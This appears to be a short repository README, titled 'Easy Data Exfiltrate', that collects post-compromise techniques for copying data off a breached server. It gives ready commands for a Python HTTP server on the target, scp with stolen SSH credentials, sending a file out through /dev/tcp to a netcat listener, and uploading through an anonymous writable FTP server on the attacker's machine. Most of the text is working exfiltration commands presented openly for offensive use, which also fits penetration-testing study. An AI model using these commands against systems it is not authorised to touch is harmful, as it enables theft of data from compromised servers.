# Easy Data Exfiltrate

This repository contains the techniques for data exfiltration after compromising a server. 

## Using Python Server
The easiest method will be to start a Python HTTP Server on the target server, and downloading
the required data in personal system through web browser. 

In Python 3.x the following command can be used to start a python server:

```bash
python3 -m http.server 8000
```

In Python 2.x the following command can be used to start a python server. 

```bash
python -m SimpleHTTPServer 8000
```

But mostly, you will not find python installed on the compromised system, so you can try the next technique. 

## Through SSH

If the SSH port is open and you have the SSH credentials, then the data can be transferred through ssh easily using the technique given below:

Run This command on your own system

```bash
scp user@ServerIP:/home/location/of/the/data.zip Location/on/MySystem.zip
```
> [!NOTE]
> This will ask for the SSH Password if you are not in the authorized_keys.


The above command will simply copy the file/data from remote server just like the `cp` command copies files in your own system. 


### Through TCP connection


```bash
cat file.zip > /dev/tcp/IP/PORT
```

This will send the contents of a file file.zip over a TCP connection to a remote host IP on a specific PORT. We can recieve the file with netcat with the following command. 

```bash
nc -lvnp PORT > file.zip
```


### Through FTP 

If we can connect with any FTP server from the machine, then we can use this method. 

Run the FTP server on your own attacking machine.

```bash
python3 -m pyftpdlib -p 21 --write
```

This will start a python server on the attacking machine with anonymous login enabled and `--write` will make it writeable.

From the target machine, we can connect with the above started FTP server as below:

```bash
ftp IP

# Hit Enter if asked for password

put file.zip 
```

This will upload the file.zip on our own attacking machine from the target machine. 









